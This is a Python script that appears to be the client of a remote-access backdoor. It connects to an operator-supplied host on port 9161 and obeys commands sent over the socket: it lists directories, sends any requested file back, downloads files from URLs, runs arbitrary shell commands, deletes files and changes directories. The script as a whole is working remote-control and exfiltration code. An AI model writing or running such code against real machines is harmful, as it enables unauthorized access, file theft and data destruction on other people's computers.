import socket,time
import os
import requests
from tqdm import tqdm
s=socket.socket()
port=9161;
host=input("Enter the host ip address:-  ")
s.connect((host,port))
print('\nConnected to the host.....\n')

#Connection done

#Receiving Commands now
while True:
    command=s.recv(5000)
    command=command.decode()
    print('Command received and decoded.....\n')
    if command=='view_cwd':
        data=os.getcwd()
        data=data.encode()
        print('Command executed and encoded to be sent...\n')
        s.send(data)
        print('Result sent\n')
    elif command=='open_dir':
        path=s.recv(5000)
        path=path.decode()
        print('Path decoded and going for execution\n')
        list=os.listdir(path)
        list=str(list)
        list=list.encode()
        print('List of files and folders encoded and waiting for it to be sent....\n')
        s.send(list)
        print('List of files and folders sent to the host......\n')
    elif command=='file_download':
        path=s.recv(5000)
        print('Path for downloading the file recieved..')
        file=open(path.decode(),'rb')
        data=file.read()
        file.close()
        #data=data.encode()
        print('File encoded and ready to be sent.....')
        s.send(data)
        print('File sent.')
    elif command=='link_download':
        url=s.recv(5000)
        url=url.decode()
        print('Received the url...now making requests to the url')
        r=requests.get(url,stream=True)
        size=int(r.headers['content-length'])/1024
        print()
        name=s.recv(5000)
        name=name.decode()
        print('Received the name of the file from the server and now making the file on the slave..')
        file=open(name,'wb')
        print('Downloading the file......')
        for data in tqdm(r.iter_content(),total=size,unit='KB'):
            file.write(data)
        print('File downloaded into the system')
        message='File downloaded..'
        message=message.encode()
        s.send(message)
        print('Message sent to the host PC...')
        r.close()
        file.close()
    elif command=='run':
        c=''
        while c!='exit':
            c=s.recv(5000)
            c=c.decode()
            print('Command received.')
            a=str(os.system(c))
            print('Command executed')
            f=open('D:\data.txt','w')
            f.write(a)
            f.close()
            f=open('D:\data.txt','r')
            a=f.read()
            f.close()
            s.send(a.encode())
            s.send('Command executed and data received is stored in your PC.'.encode())
            os.remove('D:\data.txt')
            print('Command executed and data sent back to the server if any..')
    elif command=='remove_file':
        path=s.recv(5000)
        path=path.decode()
        if(os.path.exists(path)==True):
            os.remove(path)
            s.send('File deleted successfully'.encode())
            print('File deleted successfully')
        else:
            s.send('File not found'.encode())
            print('File not found')
    elif command=='exit':
        s.close()
        print('Connection closed.Exiting program in 10 seconds')
        time.sleep(10)
        exit()
    elif command=='nav':
        path=''
        while path!='exit':
            path=s.recv(5000)
            path=path.decode()
            os.chdir(path)
            s.send('Changed current directory'.encode())


    else:
        print('Invalid command\n')
